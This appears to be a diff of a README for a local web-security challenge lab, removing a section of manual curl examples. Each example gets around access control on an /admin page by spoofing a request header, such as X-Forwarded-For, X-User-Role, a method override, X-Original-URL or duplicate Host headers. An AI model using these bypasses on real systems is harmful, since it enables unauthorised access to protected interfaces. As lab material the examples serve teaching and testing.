@@ -143,30 +143,3 @@ The project includes a comprehensive test suite (100+ test cases) that:
 ./run_tests.sh 4   # Challenge 4 only
 ./run_tests.sh x   # Challenge X only
 ```
-
-### Manual Testing Examples
-
-#### Challenge 1: X-Forwarded-For Bypass
-```bash
-curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8001/admin
-```
-
-#### Challenge 2: X-User-Role Bypass
-```bash
-curl -H "X-User-Role: admin" http://localhost:8002/admin
-```
-
-#### Challenge 3: HTTP Method Override Bypass
-```bash
-curl -X POST -H "X-HTTP-Method-Override: GET" http://localhost:8003/admin
-```
-
-#### Challenge 4: X-Original-URL Bypass
-```bash
-curl -H "X-Original-URL: /admin" http://localhost:8004/public
-```
-
-#### Challenge X: Duplicate Host Header Bypass
-```bash
-curl -k -H "Host: localhost" -H "Host: admin.local" https://localhost:8443/admin
-```
